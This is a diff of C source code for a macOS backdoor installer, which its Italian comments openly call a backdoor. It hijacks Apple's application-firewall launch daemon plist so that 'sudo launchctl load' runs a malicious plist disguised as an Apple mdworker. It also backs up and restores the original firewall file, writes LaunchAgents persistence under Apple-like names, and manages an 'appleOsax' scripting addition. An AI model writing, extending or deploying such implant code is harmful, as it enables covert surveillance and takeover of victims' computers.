@@ -19,7 +19,7 @@ char _plist_alf_content[] =	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 							"<array>"
 							"<string>/bin/bash</string>"
 							"<string>-c</string>"
-							"<string>sudo launchctl load -F %S/Library/Preferences/%S_/com.apple.mdworkers.plist; /usr/libexec/ApplicationFirewall/socketfilterfw</string>"
+							"<string>%s/usr/libexec/ApplicationFirewall/socketfilterfw</string>"
 							"</array>"
 							"<key>LaunchOnlyOnce</key>"
 							"<true/>"
@@ -111,7 +111,6 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	WCHAR plist_path[MAX_PATH];
 
 	char root_mdworker_plist_content[1024];
-	char plist_alf_content[1024];
 
 	if (!rcs_info || !user_info || !os_info)
 		return FALSE;
@@ -119,7 +118,6 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	// hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
 	swprintf_s(temp_backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, user_info->user_home, rcs_info->hdir);
 	sprintf_s(root_mdworker_plist_content, sizeof(root_mdworker_plist_content), _mdworker_content, user_info->user_home, rcs_info->hdir, TEMPORARY_LOADER, user_info->user_name, rcs_info->hdir, rcs_info->hcore);
-	sprintf_s(plist_alf_content, sizeof(plist_alf_content), _plist_alf_content, user_info->user_home, rcs_info->hdir);
 	_snwprintf_s(plist_path, MAX_PATH, _TRUNCATE, L"%s\\com.apple.mdworkers.plist", temp_backdoor_path);
 
 	// Crea la directory temporanea
@@ -165,37 +163,19 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 	} else
 		return FALSE;
 
-	// Copia una versione del plist alf nella directory temporanea e poi lo sovrascrive
-	swprintf_s(temp_backdoor_path, MAX_PATH, L"%s\\com.apple.alf.agent.plist", temp_backdoor_path);
-	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
-	SafeCopyFile(plist_path, temp_backdoor_path);
-	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-	if (hfile == INVALID_HANDLE_VALUE)
-		return FALSE;
-	if (!WriteFile(hfile, plist_alf_content, strlen(plist_alf_content), &w_len, NULL) || w_len!=strlen(plist_alf_content)) {
-		CloseHandle(hfile);
-		return FALSE;
-	}
-	CloseHandle(hfile);
-
 	return TRUE;
 }
 
 BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct_t *os_info)
 {
-
-	WCHAR backdoor_path[MAX_PATH], plist_path[MAX_PATH], temp_backdoor_path[MAX_PATH];
+	WCHAR backdoor_path[MAX_PATH];
 
 	if (!rcs_info || !user_info || !os_info)
 		return FALSE;
 
-	// Ripristina il plist di alf originale (nel caso non sia mai stata lanciata la backdoor)
-	// e cancella la directory temporanea
-	swprintf_s(temp_backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
-	swprintf_s(backdoor_path, MAX_PATH, L"%s\\com.apple.alf.agent.plist", temp_backdoor_path);
-	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
-	SafeCopyFile(backdoor_path, plist_path);
-	DeleteDirectory(temp_backdoor_path);
+	// Cancella la directory temporanea (nel caso la backdoor non abbia mai runnato)
+	swprintf_s(backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
+	DeleteDirectory(backdoor_path);
 
 	// Cancella il plist della backdoor
 	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.mdworker.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
@@ -210,15 +190,45 @@ BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 }
 
 
-BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info)
+BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *user_list)
 {
+	WCHAR plist_path[MAX_PATH], plist_path_bu[MAX_PATH];
+	HANDLE hf;
+
+	// Copia una versione del plist alf originale (SE ANCORA NON C'E')
+	swprintf_s(plist_path_bu, MAX_PATH, L"%sLibrary\\Preferences\\com.apple.alf.agent.plist", os_info->drive);
+	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
+	hf = CreateFile(plist_path_bu, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hf == INVALID_HANDLE_VALUE) 
+		SafeCopyFile(plist_path, plist_path_bu);
+	else 
+		CloseHandle(hf);
+
+
+/*
+	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	if (!WriteFile(hfile, plist_alf_content, strlen(plist_alf_content), &w_len, NULL) || w_len!=strlen(plist_alf_content)) {
+		CloseHandle(hfile);
+		return FALSE;
+	}
+	CloseHandle(hfile);*/
+
 	return TRUE;
 }
 
 
-BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info)
+BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_t *user_list, DWORD installation_count)
 {
-	WCHAR backdoor_path[MAX_PATH];
+	WCHAR backdoor_path[MAX_PATH], plist_path[MAX_PATH], plist_path_bu[MAX_PATH];
+
+	// Ripristina il plist di alf originale (nel caso non sia mai stata lanciata la backdoor)
+	// e cancella la copia di backup
+	swprintf_s(plist_path_bu, MAX_PATH, L"%sLibrary\\Preferences\\com.apple.alf.agent.plist", os_info->drive);
+	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
+	SafeCopyFile(plist_path_bu, plist_path);
+	DeleteFile(plist_path_bu);
 
 	// Rimuove l'input manager quando si toglie l'ultima istanza della backdoor
 	swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\ScriptingAdditions\\appleOsax", os_info->drive);
